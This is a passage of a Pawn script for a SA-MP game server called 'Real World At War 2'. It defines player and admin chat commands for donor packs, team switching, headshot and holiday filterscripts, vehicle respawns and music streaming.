	SendClientMessage(playerid, COLOR_ORANGE, "_________|- Real World At War 2™ Donor price -|_________");
	SendClientMessage(playerid, COLOR_GREEN, "Donor Rank in forum (3 euro)");
	SendClientMessage(playerid, COLOR_GREEN, "Donor Rank 1 (9 euro)");
	SendClientMessage(playerid, COLOR_GREEN, "Donor Rank 2 (13 euro)");
	SendClientMessage(playerid, COLOR_GREEN, "Donor Rank 3 (17 euro)");
	SendClientMessage(playerid, COLOR_GREEN, "Donor Pack 1 (36 euro)");
	SendClientMessage(playerid, COLOR_GREEN, "Operator Stats (15 Euro)");
	return true;
}
*/
CMD:donorprice(playerid, params[])
{
ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX ,"COD-RWW2 Donor Prices:","\n_________|- Real World At War 2™ Donor price -|_________\nDonor Rank in forum (2 Dollars)\nDonor Rank 1 (5 Dollars)\nDonor Rank 2 (10 Dollars)\nDonor Rank 3 (15 Dollars)\nDonor Rank 4 (25 Dollars)\nDonor Rank 5 (30 Dollars) [/donorpack]\nOperator Stats (15 Dollars)\nCheap Donor Prices And Cool Packs","Ok","Cancel");
return 1;
}
CMD:sotheme(playerid, params[])
{
PlayAudioStreamForPlayer(playerid,"http://free.mp3songurls.com/1433754.mp3");
return 1;
}
CMD:sntheme(playerid, params[])
{
PlayAudioStreamForPlayer(playerid,"http://s320.ve.vc/data/320/32265/One_Bottle_Down_-_www.DjPunjab.Com.mp3");
return 1;
}
CMD:hostname(playerid, params[])
{
SendRconCommand("hostname •XP•Real World At War 2™•[Ultra-H.com]•TDM•");
return 1;
}
CMD:donorpack(playerid, params[])
{
	new did;
    if(sscanf(params,"d",did)) return SendClientMessage(playerid, RED,"Use /donorpack [1-6]");
	switch(did)
	{
	    case 1:
		{
			SendClientMessage(playerid, COLOR_ORANGE, "_________|- Real World At War 2™ Donor Pack -|_________");
			SendClientMessage(playerid, COLOR_GREEN, "Donor Pack 1 Price 5.00$ ");
			SendClientMessage(playerid, COLOR_GREEN, "--> Donor Level 1");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Cash +150000");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Score +2500");
			SendClientMessage(playerid, COLOR_ORANGE, "See /donorpack 2 for Pack 2");
		}
		case 2:
		{
            SendClientMessage(playerid, COLOR_ORANGE, "_________|- Real World At War 2™ Donor Pack -|_________");
			SendClientMessage(playerid, COLOR_GREEN, "Donor Pack 2 Price 10.00$ ");
			SendClientMessage(playerid, COLOR_GREEN, "--> Donor Level 2");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Cash +500000");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Score +5000");
			SendClientMessage(playerid, COLOR_GREEN, "--> Server Tester / Help Operator Status");
			SendClientMessage(playerid, COLOR_ORANGE, "See /donorpack 3 for Pack 3");
		}
		case 3:
		{
            SendClientMessage(playerid, COLOR_ORANGE, "_________|- Real World At War 2™ Donor Pack -|_________");
			SendClientMessage(playerid, COLOR_GREEN, "Donor Pack 3 Price 15.00$ ");
			SendClientMessage(playerid, COLOR_GREEN, "--> Donor Level 3 (Premium Account)");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Cash +750000");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Score +10000");
			SendClientMessage(playerid, COLOR_GREEN, "--> Server Tester / Help Operator Status");
			SendClientMessage(playerid, COLOR_ORANGE, "See /donorpack 4 for Pack 4 With Adimin Levels");
		}
		case 4:
		{
            SendClientMessage(playerid, COLOR_ORANGE, "_________|- Real World At War 2™ Donor Pack -|_________");
			SendClientMessage(playerid, COLOR_GREEN, "Premium Pack 1 Price 20.00$ ");
			SendClientMessage(playerid, COLOR_GREEN, "--> Donor Level 3 (Premium Account)");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Cash +2000000");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Score +25000");
			SendClientMessage(playerid, COLOR_GREEN, "--> Access To Donor Chat");
			SendClientMessage(playerid, COLOR_GREEN, "--> Admin Level 1");
			SendClientMessage(playerid, COLOR_ORANGE, "See /donorpack 5 for Pack 5");
		}
		case 5:
		{
            SendClientMessage(playerid, COLOR_ORANGE, "_________|- Real World At War 2™ Donor Pack -|_________");
			SendClientMessage(playerid, COLOR_GREEN, "Premium Pack 2 Price 25.00$ ");
			SendClientMessage(playerid, COLOR_GREEN, "Donor Level 3 (Premium Account)");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Cash +5000000");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Score +30000");
			SendClientMessage(playerid, COLOR_GREEN, "-->Access To Special Donor Area Ingame");
			SendClientMessage(playerid, COLOR_GREEN, "->Special Ranks On Forums");
			SendClientMessage(playerid, COLOR_GREEN, "--> Admin Level 2");
			SendClientMessage(playerid, COLOR_ORANGE, "See More Packs On Forums");
		}
		case 6:
		{
            SendClientMessage(playerid, COLOR_ORANGE, "_________|- Real World At War 2™ Donor Pack -|_________");
			SendClientMessage(playerid, COLOR_GREEN, "Premium Pack 3 Price 30.00$ ");
			SendClientMessage(playerid, COLOR_GREEN, "Donor Level 3 (Premium Account)");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Cash +7500000");
			SendClientMessage(playerid, COLOR_GREEN, "--> Ingame Score +30000");
			SendClientMessage(playerid, COLOR_GREEN, "-->Access To Special Donor Area Ingame");
			SendClientMessage(playerid, COLOR_GREEN, "->Special Ranks On Forums");
			SendClientMessage(playerid, COLOR_GREEN, "--> Admin Level 2");
			SendClientMessage(playerid, COLOR_ORANGE, "See More Packs On Forums");
		}
		default:
		{
			SendClientMessage(playerid, COLOR_ORANGE, "Please use id's from 1 to 6");
		}
	}
	return 1;
}
CMD:commands(playerid, params[])
{
	SendClientMessage(playerid, COLOR_ORANGE, "_________|- COD RWW2 COMMANDS -|_________");
	SendClientMessage(playerid, COLOR_ORANGE, "/Ranks | /Rank | /Kill | /Rules |/Attachments| /Stats | /Jp | /Dis | /Shelp");
	SendClientMessage(playerid, COLOR_ORANGE, "/Help | /Pm | /R [text] | /Ep | /Anims | /Laseron | /Lasercol | /Spree | /Getid | /Disguise");
	SendClientMessage(playerid, COLOR_ORANGE, "/Richlist | /Sync | /Rpm | /Radiohelp | /Order [text] | /Dcmds | /S [test] | /Dnd | /Switchclass");
	SendClientMessage(playerid, COLOR_ORANGE, "/Operators | /Admins | /Donors  |/Donorprice | /Cmds | /St | /Sc | /Switchteam | /Objective | /Teams | /Savestats");
	SendClientMessage(playerid, COLOR_ORANGE, "/Changename | /Changepass | /Streak | /Notes | /GM | /Nuke | /Anthraxhelp | /Times | /sites | /credits | /updates");
	return true;
}
CMD:st(playerid, params[])
{
	ForceClassSelection(playerid);
	SendClientMessage(playerid, grey,"Select your team after next death!");
	SendClientMessage(playerid, GREEN,"Can also use F4 + /Kill!");
	return 1;
}
CMD:sc(playerid, params[])
{
	SendClientMessage(playerid, grey,"Select your class after next death.");
	FirstSpawn[playerid] = 1;
    return 1;
 }
CMD:forceclass(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/forceclass [playerid]");
		new player1 = strval(params);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		       	CMDMessageToAdmins(playerid,"FORCECLASS");
				return FirstSpawn[player1] = 1;
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:forceplayer(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/forceteam [playerid]");
		new player1 = strval(params);
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		       	CMDMessageToAdmins(playerid,"FORCEPLAYER");
				return ForceClassSelection(player1);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:getadmins(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 6)
   {
       new team[100], Float:x, Float:y, Float:z, interior = GetPlayerInterior(playerid), world = GetPlayerVirtualWorld(playerid);
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/getadmins [A]");
	   GetPlayerPos(playerid, x, y, z);
	   //---------USA------------------------
	   	   if(strfind(params,"A",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   foreach(Player, i)
		   {
			   if(gTeam[i] == TEAM_NONE)
			   {
				   SetPlayerPos(i, x+1, y, z);
                   SetPlayerInterior(i, interior);
				   SetPlayerVirtualWorld(i, world);
				   TogglePlayerControllable(i, true);
				   PlayerInfo[i][Frozen] = 0;
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has teleported %s all the admins",PlayerName2(playerid),params);
		   MessageToAdmins(blue,string);
		   format(string,sizeof(string),"Administrator Team Has Been Teleported!");
		   MessageToAdmins(blue,string);
		   CMDMessageToAdmins(playerid,"GETADMINS");
	   }
	}
	else return SendClientMessage(playerid, red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}
CMD:forceteam(playerid, params[])
{
   	if(PlayerInfo[playerid][Level] >= 4)
   	{
	   	new team[100];
	   	if(sscanf(params,"s[100]",team))
		   	return SendClientMessage(playerid, RED,"JikyBot: Usage:/forceteam [teamname usa,viet,euro,arabia,aus,sov]");
	   //---------USA------------------------
	   	if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   	{
		   	foreach(Player, i)
		   	{
			   	if(gTeam[i] == TEAM_USA)
			   	{
				   	ForceClassSelection(playerid);
				   	SetPlayerHealth(i,0);
			   	}
		   	}
		   	new string[100];
		   	format(string,sizeof(string),"Administrator %s has Force team %s To Change The Team",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   	}
	   //---------------------------------
	   //--------Eurasia----------------
	   	if(strfind(params,"Euro",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   	{
		   	foreach(Player, i)
		   	{
			   	if(gTeam[i] == TEAM_EURASIA)
			   	{
				   	ForceClassSelection(playerid);
				   	SetPlayerHealth(i,0);
			   	}
		   	}
		   	new string[100];
		   	format(string,sizeof(string),"Administrator %s has Force team %s To Change The Team ",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   }
	   //-------Arabia---------
	   if(strfind(params,"Arab",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
     		foreach(Player, i)
		   	{
			   	if(gTeam[i] == TEAM_ARAB)
			   	{
				   	ForceClassSelection(playerid);
				   	SetPlayerHealth(i,0);
			   	}
		   	}
		   	new string[100];
		   	format(string,sizeof(string),"Administrator %s has Force team %s To Change The Team ",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   	}
	   //----------Soviet-------
	   	if(strfind(params,"rus",true) != -1 || strfind(params,"Russia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   	{
		   	foreach(Player, i)
		   	{
			   	if(gTeam[i] == TEAM_SOVIET)
			   	{
				   	ForceClassSelection(playerid);
				   	SetPlayerHealth(i,0);
			   	}
		   	}
		   	new string[100];
		   	format(string,sizeof(string),"Administrator %s has Force team %s To Change The Team ",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   	}
	   	//-----------Australia---------
	   	if(strfind(params,"Aus",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   	{
		   	foreach(Player, i)
		   	{
			   	if(gTeam[i] == TEAM_AUS)
			   	{
				   	ForceClassSelection(playerid);
				   	SetPlayerHealth(i,0);
			   	}
		   	}
		   	new string[100];
		   	format(string,sizeof(string),"Administrator %s has Force team %s To Change The Team",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   	}
	   	if(strfind(params,"viet",true) != -1) //Merc
	   	{
		   	foreach(Player, i)
		   	{
			   	if(gTeam[i] == TEAM_MARVEL)
			   	{
				   	ForceClassSelection(playerid);
					SetPlayerHealth(i,0);
			   	}
		   	}
		   	new string[100];
		   	format(string,sizeof(string),"Administrator %s has Force team %s To Change The Team ",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   	}
	}
	else return SendClientMessage(playerid, red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}
CMD:switchteam(playerid, params[])
{
	ForceClassSelection(playerid);
	SendClientMessage(playerid, grey,"Select your team after next death!");
	SendClientMessage(playerid, GREEN,"Can also use F4 + /Kill!");
	return 1;
}
CMD:switchclass(playerid, params[])
{
    SetPlayerHealth(playerid, 0.0);
	SendClientMessage(playerid, grey,"Select your class after next death.");
	FirstSpawn[playerid] = 1;
	return 1;
}

CMD:ep(playerid, params[])
{
	GivePlayerWeapon(playerid, 46,1);
	SendClientMessage(playerid, -1, "Emergency Parachute!");
	return 1;
}

CMD:notes(playerid, params[])
{
	SendClientMessage(playerid, green, "________________| COD:Real World at War 2 V10.4.9 Release Updates: |________________");
	SendClientMessage(playerid, green, " Quake Sounds Have Been Added");
	SendClientMessage(playerid, green, " Group System Has Been Added [/grouphelp]");
	SendClientMessage(playerid, green, " Vehicle Eject Added Press 'Y' when you are in a any Heavy & Air Vehicles.");
 	SendClientMessage(playerid, green, " Emergency Parachute Added [/ep]");
 	SendClientMessage(playerid, green, " Math system And Moneybag System Have Been Added");
	return 1;
}
CMD:credits1(playerid, params[]) {
	SendClientMessage(playerid, green,"Server Credits:");
	SendClientMessage(playerid, green,"Server is Scripted By Perfect_Boy");
	SendClientMessage(playerid, green,"Server hosted By Perfect_Boy");
	return 1;
}
/*CMD:recoverscore(playerid, params[]) {
 	if(recovery == 1)
 	{
	MySQL_Login_Old(playerid);
 	GameTextForAll("Use /recoverscore to recover old stats if you havent used it yet",4000,3);
 	}
	return 1;
}
*/
CMD:credits2(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 0)
	{
			SendClientMessage(playerid, COLOR_WHITE,    "|----------= XP-COD-RWW2_Credits: =----------|");
			SendClientMessage(playerid, COLOR_YELLOW,   "|----------= Scripted And Updated by Perfect_Boy =---------|");
			SendClientMessage(playerid, COLOR_YELLOW,   "|----------= Server Owned And Hosted by Perfect_Boy =--------|");
			SendClientMessage(playerid, red,      "Script Made by Perfect_Boy, Not allowed to Scam And Sell Script");
	} else return SendClientMessage(playerid,red, "Welcome to Real World Wat War 2 v10.9.6");
	return 1;
}

public OnPlayerCommandText(playerid, cmdtext[])
{

if(!strcmp(cmdtext, "/credits0", true))
{
    ShowPlayerDialog(playerid, 802, DIALOG_STYLE_MSGBOX, "COD-Real World At War 2 Credits", "|----------= XP-COD-RWW2_Credits: =----------|/n|----------= Scripted And Updated by Perfect_Boy =---------|/n|----------= Server Owned And Hosted by Perfect_Boy =--------|/n|----------= Beta Tester: [XP]Sumeeth =----------|/nScript Made by Perfect_Boy, Not allowed to Scam And Sell Script/nCall Of Duty : Real World At War 2 V10.9.6 ", "Okay", "Back");
    return 1;
}

return 0;
}
//======================Headshot And Christmas=========================================================================================

CMD:hsconfig(playerid, params[])
{
if(PlayerInfo[playerid][LoggedIn] == 1 && PlayerInfo[playerid][LoggedIn] == 1)
{
   	new radiolink[100];
	if(sscanf(params,"s[100]", radiolink)) return SendClientMessage(playerid, 0xFFFFFFFF,"use /hsconfig [1 - 4]");
   	if(strfind(radiolink, "1", true) != -1)
   	{
				new string[128];
				format(string,sizeof(string),"Administrator %s has enabled headshot system.[ALL WEAPONS]",pName(playerid));
                SendClientMessageToAll(0x0080FFFF,string);
                hs_normal = 1;
                hs_sniper = 1;
                SendClientMessage(playerid,blue,"Debug Output: hs_normal = 1 and hs_sniper = 1");
   	}
   	else if(strfind(radiolink, "2", true) != -1)
   	{
				new string[128];
				format(string,sizeof(string),"Administrator %s has enabled headshot system.[SNIPERS ONLY]",pName(playerid));
                SendClientMessageToAll(0x0080FFFF,string);
                hs_normal = 0;
                hs_sniper = 1;
                SendClientMessage(playerid,blue,"Debug Output: hs_normal = 0 and hs_sniper = 1");
   	}
   	else if(strfind(radiolink, "3", true) != -1)
   	{
				new string[128];
				format(string,sizeof(string),"Administrator %s has enabled headshot system.[ALL WEAPONS EXCEPT SNIPER]",pName(playerid));
                SendClientMessageToAll(0x0080FFFF,string);
                hs_normal = 1;
                hs_sniper = 0;
                SendClientMessage(playerid,blue,"Debug Output: hs_normal = 1 and hs_sniper = 0");
   	}
   	else if(strfind(radiolink, "4", true) != -1)
   	{
				new string[128];
				format(string,sizeof(string),"Administrator %s has disaabled headshot system.[ALL WEAPONS]",pName(playerid));
                SendClientMessageToAll(0x0080FFFF,string);
                hs_normal = 0;
                hs_sniper = 0;
                SendClientMessage(playerid,blue,"Debug Output: hs_normal = 0 and hs_sniper = 0");
   	}
   	return 1;
}
else return SendClientMessage(playerid,red,"JikyBot: You are not authorised to use this commands");
}
/*CMD:recoverymode(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 8)
		{
				new string[128];
				format(string,sizeof(string),"Administrator %s has enabled old database system.",pName(playerid));
                SendClientMessageToAll(0x0080FFFF,string);
                recovery = 1;
                SendClientMessage(playerid,blue,"Old Database Succesfully loaded");
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:recoverymodeoff(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 8)
		{
				new string[128];
				format(string,sizeof(string),"Administrator %s has disabled old database system.",pName(playerid));
                SendClientMessageToAll(0x0080FFFF,string);
                recovery = 0;
                SendClientMessage(playerid,blue,"Old Database Succesfully ejected");
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
*/
CMD:enablepump(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 8)
		{
				new string[128];
				format(string,sizeof(string),"Administrator %s has enabled pumpkin system.",pName(playerid));
                SendClientMessageToAll(0x0080FFFF,string);
                SendRconCommand("loadfs halo");
                SendClientMessage(playerid,blue,"Filter Script Succesfully loaded");
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
CMD:disablepump(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 8)
		{
				new string[128];
				format(string,sizeof(string),"Administrator %s has disable pumpkin system.",pName(playerid));
                SendClientMessageToAll(0x0080FFFF,string);
                SendRconCommand("unloadfs halo");
                SendClientMessage(playerid,blue,"Filter Script Succesfully loaded");
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}

CMD:disablehs(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 8)
		{
				new string[128];
				format(string,sizeof(string),"Administrator %s has disabled headshot system.",pName(playerid));
                SendClientMessageToAll(0x0080FFFF,string);
                SendRconCommand("unloadfs hs");
                SendClientMessage(playerid,blue,"Filter Script Succesfully unloaded, I think you Don't Like headShot system, DO you?");
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}

CMD:enablexmas(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 8)
		{
				new string[128];
				format(string,sizeof(string),"Administrator %s has enabled XMAS GIFT system.",pName(playerid));
                SendClientMessageToAll(0x0080FFFF,string);
                SendRconCommand("loadfs cpack3");
                SendClientMessage(playerid,blue,"Filter Script Succesfully loaded, Happy XMAS!");
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}

CMD:disablexmas(playerid,params[]) // can i show u something? somwthing what?
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 8)
		{
				new string[128];
				format(string,sizeof(string),"Administrator %s has disabled XMAS GIFT system.",pName(playerid));
                SendClientMessageToAll(0x0080FFFF,string);
                SendRconCommand("unloadfs cpack3");
                SendClientMessage(playerid,blue,"Filter Script Succesfully unloaded, I think you Don't Like XMAS system, DO you?");
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
//==================================My Dsay=====================================================================================t

CMD:dsay(playerid, params[])
{
   new varsay[10];
   if(sscanf(params,"s[10]", varsay)) return SendClientMessage(playerid, 0xFFFFFFFF,"use /dsay  [0 - 1]");
   if(strfind(varsay, "0", true) != -1)
   {
   		dsay = 0;
    	SendClientMessage(playerid,0x0080FFFF,"Variable dsay set to 0");
   }
   else if(strfind(varsay, "1", true) != -1)
   {
      	dsay = 1;
    	SendClientMessage(playerid,0x0080FFFF,"Variable dsay set to 1");
   }
   return 1;
}
CMD:ghostrider(playerid,params[]) // Better huh onlyunused car respawn
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 4)
		{
		 	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, 0xFF0000AA, "[GHOSTRIDER] {FFFFFF}You have to be in a 'freeway' motorbike!");
	  	    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, 0xFF0000AA, "[GHOSTRIDER] {FFFFFF}You must be the driver!");
	  	    if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 463) return SendClientMessage(playerid, 0xFF0000AA, "[GHOSTRIDER] {FFFFFF}You have to be in a 'freeway' motorbike!");
			if(grider[playerid][0]){
		    	DestroyObject(grider[playerid][0]);
		    	DestroyObject(grider[playerid][1]);
		    	DestroyObject(grider[playerid][2]);
		    	grider[playerid][0] = 0;
		    	return 1;
			}
			new Float:vh;
			GetVehicleHealth(GetPlayerVehicleID(playerid), vh);
			if(vh < 250) return SendClientMessage(playerid, 0xFF0000AA, "[GHOSTRIDER] {FFFFFF}Repair your bike first!");
	  	    grider[playerid][0] = CreateObject(18689, 0.0, 0.0, 0.0, 0.0, 0.0, 256.0);
	  	    grider[playerid][1] = CreateObject(18689, 0.0, 0.0, 0.0, 0.0, 0.0, 256.0);
	  	    grider[playerid][2] = CreateObject(18693, 0.0, 0.0, 0.0, 0.0, 0.0, 256.0);
	  	    AttachObjectToVehicle(grider[playerid][0], GetPlayerVehicleID(playerid), 0.0, 0.6, -1.7, 0.0, 0.0, 0.0);
	  	    AttachObjectToVehicle(grider[playerid][1], GetPlayerVehicleID(playerid), 0.0, -1.4, -1.7, 0.0, 0.0, 0.0);
	  	    AttachObjectToPlayer(grider[playerid][2], playerid, 0.0, -0.01, -0.9, 0.0, 0.0, 0.0);
	  	    ChangeVehicleColor(GetPlayerVehicleID(playerid), 0, 0);
	  	    CMDMessageToAdmins(playerid,"GHOSTRIDER");
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}
//==========================Rcon index and new cmds of admin area=======
CMD:rconpw(playerid,params[])
{
	if(PlayerInfo[playerid][Level] >= 0)
	{
	    new pwstring[48];
	    format(pwstring, sizeof(pwstring), "[RconPro] The current password index is: %d", currenthcindex);
	    SendClientMessage(playerid, 0xFFFFFFFF, pwstring);
    }
	return 1;
}
//================================Message to admns++++++++++++++++++++++

CMD:sendadminmsg(playerid, params[])
{
	new str[128], Name1[MAX_PLAYER_NAME];
	if(sscanf(params,"s[128]", str))
	{
		 SendClientMessage(playerid, red,"CORRECT JikyBot: Usage:/sendadminmsg [text]");
		 return 0;
	}
	GetPlayerName(playerid, Name1, sizeof(Name1));
	format(str, sizeof(str),"{00FFFF}[ADMIN MSG From %s]:{00FFF0} %s",Name1, str);
	MessageToTwice(red, str);
	SendClientMessage(playerid, yellow,"Message Sent");
	return 1;
}
//====================================Only Spawn empty cars===================
	
CMD:ruc(playerid,params[]) // Better huh onlyunused car respawn
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 4)
		{
				new string[128];
				format(string,sizeof(string),"Administrator %s has respawn only unused vehicles.",pName(playerid));
                SendClientMessageToAll(blue,string);
                CMDMessageToAdmins(playerid,"RUC");
    			forveh(i)
				{
			    	if(IsVehicleOccupied(i) == 0)
			    	{
			        	SetVehicleToRespawn(i);
			    	}
				}
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}

CMD:url(playerid,params[])
{
    if(PlayerInfo[playerid][Level] >= 8)
	{
	    new url[200], pname[124], string[250];
	    GetPlayerName(playerid, pname, sizeof(pname));
	    CMDMessageToAdmins(playerid,"URL");
		if(sscanf(params, "s[200]", url)) return SendClientMessage(playerid,-1,"Usage : /url [Url]") &&
		SendClientMessage(playerid,-1,"Function : Will stream a music for all player.");
		format(string, sizeof(string), "Admin %s(%d) has streamed a music | Url : %s", pname, playerid, url);
	    SendClientMessageToAll(-1, string);
		SendClientMessageToAll(-1, "======================================");
		foreach(Player, i)
	    {
	        PlayAudioStreamForPlayer(i, url);
	    }
	    SendClientMessageToAll(-1, "======================================");
	    SendClientMessageToAll(-1, "Use /radiostop if you lagging or you don't want to hear this song");
	    return 1;
	}
    else return SendClientMessage(playerid,-1,"ERROR: You're not DJ to use this command.");
}
CMD:tdremoveall(playerid,params[]) {
if(PlayerInfo[playerid][Level] >= 3)
{
  	TextDrawHideForPlayer(playerid, EUR);
	TextDrawHideForPlayer(playerid, I);
	TextDrawHideForPlayer(playerid, E);
	TextDrawHideForPlayer(playerid, A);
	TextDrawHideForPlayer(playerid, S);
	TextDrawHideForPlayer(playerid, U);
	TextDrawHideForPlayer(playerid, A2);
     TextDrawHideForPlayer(playerid,Load);
	TextDrawHideForPlayer(playerid, welcometo1);
	TextDrawHideForPlayer(playerid, welcometo2);
	TextDrawShowForPlayer(playerid, Web);
	TextDrawShowForPlayer(playerid, BFB);
	TextDrawShowForPlayer(playerid, BFBO);
    SendClientMessage(playerid, 0xFFFFFFFF, "TEXTDRAWS HIDDEN");
    }
	return 1;
}



//++++++++++++++++++++++++++++++++++NRG DESTROY++++++++++++++++++++++++++++
CMD:desnrg(playerid,params[]) // Better huh onlyunused car respawn
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 4)
		{
				new string[128];
				format(string,sizeof(string),"Administrator %s has respawn extra unused vehicles.",pName(playerid));
                SendClientMessageToAll(blue,string);
                CMDMessageToAdmins(playerid,"DESNRG");
    			return uselessnrg();
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
//	return 1;
}
CMD:fixinvisible(playerid,params[]) // Better huh onlyunused car respawn
{
	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 4)
		{
				new string[128];
				format(string,sizeof(string),"Administrator %s has fixed invisible vehicles.",pName(playerid));
                SendClientMessageToAll(blue,string);
                CMDMessageToAdmins(playerid,"FIXINVISIBLE");
    			//for(new i=306;i<MAX_VEHICLES;i++)
				forveh(i)
				{
			    	LinkVehicleToInterior(i, 0);
				}
		}
	  else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	}
	else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
	return 1;
}

CMD:find(playerid,params[])
{
	new id,str[128];
	new pname[MAX_PLAYER_NAME+1];
	CMDMessageToAdmins(playerid,"FIND");
	if(sscanf(params, "u", id)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /find [playerid]");
//	if(Finding[id] == 0) return SendClientMessage(playerid,COLOR_LIGHTRED,"You Are not finding that player");
